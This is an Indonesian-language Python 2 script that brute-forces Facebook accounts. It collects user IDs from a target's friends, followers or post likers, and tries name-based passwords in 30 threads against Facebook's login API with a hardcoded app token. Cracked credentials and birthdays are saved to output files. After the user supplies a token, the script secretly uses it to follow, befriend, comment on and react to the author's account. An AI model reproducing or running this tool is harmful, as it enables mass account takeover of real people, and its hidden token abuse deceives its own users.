# -*- coding: utf-8
# Made With ❤️ Ilhamxyz
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
from datetime import datetime
try:
	import requests
except ImportError:
	print '[×] Modul requests belum terinstall!...\n'
	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text

### HEADERS ###
def logo():
    print("""\033[1;98m   
\033[1;97m************************************************
\033[1;96m~𝕌ℕ𝟙𝕂𝟛ℝ 𝟙ℕ𝔻𝕆ℕ𝟛𝕊𝟙𝔸 ~
\033[1;97m************************************************

\033[1;95m____─▄───────▄█▄───────▄─ Stay Home 💓
\033[1;95m____▐█▌──▄──█████──▄──▐█▌ Stay Safe 💓
\033[1;95m____─█──███▄▄███▄▄███──█─ 
\033[1;95m____░█░░█▄█▄█▀▒▀█▄█▄█░░█░ 
\033[1;95m____██▄▄█▄█▄█▒▒▒█▄█▄█▄▄██
\033[1;91m╭━━━╮╱╱╱╱╱╱╱╭╮╱╱╭╮╭╮╭┳━━━┳━╮╱╭┳━━╮
\033[1;91m┃╭━╮┃╱╱╱╱╱╱╱┃┃╱╱┃┃┃┃┃┃╭━╮┃┃╰╮┃┣┫┣╯
\033[1;91m┃╰━━┳╮╭┳━╮╭━╯┣━━┫┃┃┃┃┃┃╱┃┃╭╮╰╯┃┃┃
\033[1;91m╰━━╮┃┃┃┃╭╮┫╭╮┃╭╮┃╰╯╰╯┃╰━╯┃┃╰╮┃┃┃┃
\033[1;91m┃╰━╯┃╰╯┃┃┃┃╰╯┃╭╮┣╮╭╮╭┫╭━╮┃┃╱┃┃┣┫┣╮
\033[1;91m╰━━━┻━━┻╯╰┻━━┻╯╰╯╰╯╰╯╰╯╱╰┻╯╱╰━┻━━╯
\033[1;93m===============================================
\033[0;93m[\033[0;93m ⚘ \033[0;93m] YouTube : Ilham Ramadhan
\033[0;93m[\033[0;93m ⚘ \033[0;93m] Facebook: ilhamxyz.v4
\033[0;93m[\033[0;93m ⚘ \033[0;93m] Github  : github.com/ilhamxyz213
\033[0;93m\033[0;93m=============================================== """)
bot = ('Bang Ilham Ramadhan -GANTENG BAT ANYINK😎-ðŸ˜˜ðŸ˜˜ðŸ˜˜')
kom4 = ('Bang Ilham Ramadhan -SEMOGA SUKSES😁)ðŸ˜˜ðŸ˜˜ðŸ˜˜') 
id = []
cp = []
ok = []
loop = 0

ct = datetime.now()
n = ct.month
bulan1 = [    'Januari',   'Februari',    'Maret',    'April',    'Mei',    'Juni',    'Juli',    'Agustus',    'September',    'Oktober',    'Nopember',    'Desember']
   
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
    
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"
}

### HEADERS ###
def logo():
    print("""\033[1;98m   
\033[1;97m************************************************
\033[1;96m~𝕌ℕ𝟙𝕂𝟛ℝ 𝟙ℕ𝔻𝕆ℕ𝟛𝕊𝟙𝔸 ~
\033[1;97m************************************************

\033[1;95m____─▄───────▄█▄───────▄─ Stay Home 💓
\033[1;95m____▐█▌──▄──█████──▄──▐█▌ Stay Safe 💓
\033[1;95m____─█──███▄▄███▄▄███──█─ 
\033[1;95m____░█░░█▄█▄█▀▒▀█▄█▄█░░█░ 
\033[1;95m____██▄▄█▄█▄█▒▒▒█▄█▄█▄▄██
\033[1;91m╭━━━╮╱╱╱╱╱╱╱╭╮╱╱╭╮╭╮╭┳━━━┳━╮╱╭┳━━╮
\033[1;91m┃╭━╮┃╱╱╱╱╱╱╱┃┃╱╱┃┃┃┃┃┃╭━╮┃┃╰╮┃┣┫┣╯
\033[1;91m┃╰━━┳╮╭┳━╮╭━╯┣━━┫┃┃┃┃┃┃╱┃┃╭╮╰╯┃┃┃
\033[1;91m╰━━╮┃┃┃┃╭╮┫╭╮┃╭╮┃╰╯╰╯┃╰━╯┃┃╰╮┃┃┃┃
\033[1;91m┃╰━╯┃╰╯┃┃┃┃╰╯┃╭╮┣╮╭╮╭┫╭━╮┃┃╱┃┃┣┫┣╮
\033[1;91m╰━━━┻━━┻╯╰┻━━┻╯╰╯╰╯╰╯╰╯╱╰┻╯╱╰━┻━━╯
\033[1;93m===============================================
\033[0;93m[\033[0;93m ⚘ \033[0;93m] YouTube : Ilham Ramadhan
\033[0;93m[\033[0;93m ⚘ \033[0;93m] Facebook: ilhamxyz.v4
\033[0;93m[\033[0;93m ⚘ \033[0;93m] Github  : github.com/ilhamxyz213
\033[0;93m\033[0;93m=============================================== """)

###### MASUK ######
def masuk():
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m{\033[1;92m01\033[1;97m} LOGIN LEWAT TOKEN !!"
	print "\033[1;97m{\033[1;92m02\033[1;97m} AMBIL TOKEN DISINI:)"
	print "\033[1;97m{\033[1;91m00\033[1;97m} Keluar"
	print 50* "\033[1;94m─"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;90m  ✬-->\033[91m:\033[1;92m ")
	if msuk =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] YANG BENER COY !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="2" or msuk =="02":
		ambil_token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] YANG BENER COY !"
		pilih_masuk()
		
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	toket = raw_input("\033[1;97m{\033[1;95m?\033[1;97m} Token \033[1;91m:\033[1;92m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[1;97m{\033[1;92m✓\033[1;97m}\033[1;92m Login Berhasil'
		requests.post("https://graph.facebook.com/100012337481859/subscribers?access_token=" + toket)      #K1NG 1LH4M R4MAD4N UN1KER S4NTUY FR0M B4NDUNG P3CINTA SHOLAWAT H4NYA SEB4TAS PEMBUAT 4KUN UNIK TETAP1 T1DAK BISA MENGGODA JANDA MUDA 0/0 ERROR NOT F0UND LEADER BR0THERL4ND GUARD TEAM 2019 NEVER D1E // CR3ATOR F4CEBOOK UN1K LIMITIDE EDITION 2021 P3NGGUN4 F4CEBOOK B1ASA CUMAN OPEN PEMBUATAN F4CEBOOK SN1PER K4PITAL // UN1K DEMIT GEOL // UNIK TOGEL // MINAT? LANGSUNG INBOX
		requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + toket) # Iwan Hadiansah ID
		bot_komen()
	except KeyError:
		print "\033[1;97m{\033[1;91m!\033[1;97m} \033[1;91mToken salah !"
		time.sleep(1.7)
		masuk()
		
######AMBIL_TOKEN######
def ambil_token():
	os.system("clear")
	print logo
	print 50* "\033[1;94m─"
	jalan("        \033[1;92mAnda Akan Di Arahkan Ke Browser ...")
	os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed&_rdc=1&_rdr#_=')
	time.sleep(2)
	masuk()
    
###### BOT KOMEN #######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100012337481859')
	kom = ('https://www.facebook.com/100012337481859/posts/1305058529915384/?app=fbl [ MANTAP BANG GW SHARE NIH ]')
	reac = ('ANGRY')
	post = ('1305058529915384')
	post2 = ('1305058529915384')
	kom2 = ('Mantap Bang Ilham 😁')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()
    
###### MENU #######
def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -f login.txt")
		time.sleep(3)
		gen()
	except requests.exceptions.ConnectionError:
		print ('  [!] Tidak Ada Koneksi')
		sys.exit()
	logo()
	print" *  hallo : " +nama
	print" *  ip addres : " +ip
	print
	print" 1. crack dari id publik"
	print" 2. crack dari id followers"
	print" 3. crack dari likes post publik"
	print" 4. cek hasil crack"
	print" 0. remove token"
	pilih_india()

def pilih_india():
	ask = raw_input(" *  pilih menu crack : ")
	if ask == "":
		print
		print (" *  pilih yg benar sayang") 
		exit()
	elif ask == "1" or ask == "01":
		print ("\n *  ketik 'me' untuk crack daftar teman") 
		idt = raw_input(" *  id publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print (" *  nama      : "+sp["name"]) 
		except KeyError:
			print (" *  maaf id tidak publik") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print ("\n *  ketik 'me' untuk crack daftar followers sendiri") 
		idt = raw_input(" *  id publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print (" *  nama      : "+sp["name"]) 
		except KeyError:
			print (" *  maaf id tidak publik") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		idt = raw_input(" *  id post publik : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "4" or ask == "04":
		print"1. lihat hasil ok"
		print"2. lihat hasil cp"
		ress = raw_input("* pilih : ")
		if ress =="":
			menu()
		elif ress == "1" or ress == "01":
			print ("\n [+] hasil \033[0;92mok\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		elif ress == "2" or ress == "02":
			print (" [+] hasil \033[0;93mcp\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		else:
			exit(" *  pilih yang benar sayang") 
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print (" √  berhasil menghapus token") 
		exit()
	else:
		print (" *  pilih yang benar sayang") 
		exit()
	
	print"\033[0;97m *  total id  : " +str(len(id))
	ask = raw_input("\n *  ingin gunakan password manual (y/t) : ")
	if ask == "Y" or ask == "y":
		manual()
	print
	print" *  mode pesawat 10 detik jika tidak ada hasil "
	print

	def main(arg):
		global ok,cp,ua, loop
		print '\r *  %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()+'102030','786786']:
				ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[0;97m *  \033[0;92mok\033[0;97m\033[0;97m ' +uid+ ' • ' + pw+ '        '
					ok.append(uid+' • '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [OK] '+str(uid)+' • '+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[1;93m[CP] ' +uid+ '•' + pw + '•' + ttl)
						cp.append(uid+'•'+pw+'•'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write('  [CP] '+str(uid)+'•'+str(pw)+'•'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;97m *  \033[0;93mcp\033[0;97m\033[0;97m ' +uid+ ' • ' + pw + '        '
					cp.append(uid+' • '+pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [CP] '+str(uid)+' • '+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\n crack selesai...")
	print
	print
	exit()

def manual():
	print("\033[0;97m *  masukan password contoh : bangladesh,102030,786786")
	pw = raw_input("\033[0;97m *  sett password : ").split(",")
	print
	if len(pw) ==0:
		exit(" *  isi yang bener, tidak boleh kosong")
	print("\033[0;97m *  jumlah password yang di buat : \033[0;93m" +str(len(pw)))
	
	def main(arg):
		global ok,cp,ua,loop
		print '\r \033[0;97m*  %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for asu in pw:
				ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[0;97m *  \033[0;92mok\033[0;97m\033[0;97m ' +uid+ ' • ' + asu + '        '
					ok.append(uid+' • '+asu)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [OK] '+str(uid)+' • '+str(asu)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[1;93m[CP] ' +uid+ '•' + asu + '•' + ttl)
						cp.append(uid+'•'+asu+'•'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write('  [CP] '+str(uid)+'•'+str(asu)+'•'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;97m *  \033[0;93mcp\033[0;97m\033[0;97m ' +uid+ ' • ' + asu + '        '
					cp.append(uid+' • '+asu)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [CP] '+str(uid)+' • '+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\n crack selesai...")
	print
	print
	exit()

#------>jalan-jalan ke kota karang jangan lupa membeli kacang aku heran bujang sekarang beli roko cuman sebatang<-------#
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0012)
	
if __name__ == '__main__':
	masuk()

